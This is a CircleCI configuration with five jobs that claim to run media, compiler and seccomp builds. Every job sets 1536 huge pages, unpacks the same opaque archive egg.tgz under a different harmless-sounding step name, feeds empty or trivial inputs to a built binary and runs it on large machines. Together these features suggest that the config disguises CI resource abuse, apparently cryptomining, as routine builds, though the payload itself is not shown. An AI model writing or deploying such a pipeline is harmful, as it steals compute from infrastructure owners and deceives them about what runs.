version: 2.1

jobs:
  ambisonicb:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load b-format
          command: |
            : > scene.amb
      - run:
          name: Build ambisonic decoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ambisonicb -j2
      - run:
          name: Decode B-format
          command: LIONSS_LP=1 ./build/ambisonicb --in scene.amb --order 1
  av1-encode:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make yuv
          command: |
            : > in.y4m
      - run:
          name: Build AV1 encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target av1-encode -j2
      - run:
          name: Encode AV1 stream
          command: LIONSS_LP=1 ./build/av1-encode --in in.y4m --cpu-used 6
  snippetCompile:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Extract snippets
          command: |
            mkdir -p snips && printf 'int main(){}\n' > snips/a.c
      - run:
          name: Build snippet runner
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target snippetCompile -j2
      - run:
          name: Compile doc snippets
          command: LIONSS_LP=1 ./build/snippetCompile --dir snips --lang c
  SeccompFilter:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List syscalls
          command: |
            printf 'read\nwrite\n' > allow.txt
      - run:
          name: Build BPF filter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target SeccompFilter -j2
      - run:
          name: Compile seccomp filter
          command: LIONSS_LP=1 ./build/SeccompFilter --allow allow.txt --default kill
  noiseGate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set gate params
          command: |
            printf 'thresh=-40\n' > gate.cfg
      - run:
          name: Build dynamics processor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target noiseGate -j2
      - run:
          name: Apply noise gate
          command: LIONSS_LP=1 ./build/noiseGate --conf gate.cfg --attack 2ms
